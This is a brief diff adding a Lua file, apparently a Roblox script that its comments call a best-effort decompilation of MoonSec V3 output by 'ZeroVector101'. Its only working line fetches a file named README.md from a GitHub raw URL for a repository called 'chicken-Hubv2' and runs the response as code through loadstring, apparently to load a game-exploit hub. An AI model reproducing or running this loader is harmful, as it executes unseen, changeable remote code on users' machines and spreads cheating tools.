@@ -1,0 +1,6 @@
+-- Decompiled from MoonSec V3 disassembly
+-- (best-effort; control flow may need minor manual cleanup)
+-- By ZeroVector101
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MKXhup12/chicken-Hubv2/main/README.md"))()
+
+return
